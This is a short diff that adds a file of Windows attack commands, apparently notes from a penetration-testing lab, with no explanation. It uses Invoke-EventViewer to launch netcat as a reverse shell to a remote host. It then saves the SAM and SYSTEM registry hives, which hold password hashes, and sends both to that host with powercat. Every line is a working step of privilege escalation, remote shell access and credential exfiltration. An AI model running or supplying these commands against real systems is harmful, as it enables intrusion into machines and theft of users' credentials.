@@ -1,0 +1,13 @@
+Invoke-EventViewer 'c:\windows\system32\cmd.exe /c c:\users\alice\documents\nc.exe 192.168.119.178 4433 -e cmd.exe'
+
+
+
+Invoke-EventViewer 'reg save hklm\sam c:\sam.reg'
+
+Invoke-EventViewer 'reg save hklm\system c:\system.reg'
+
+
+
+powercat -c 192.168.119.178 -p 4433 -i c:\sam.reg
+
+powercat -c 192.168.119.178 -p 4433 -i c:\system.reg
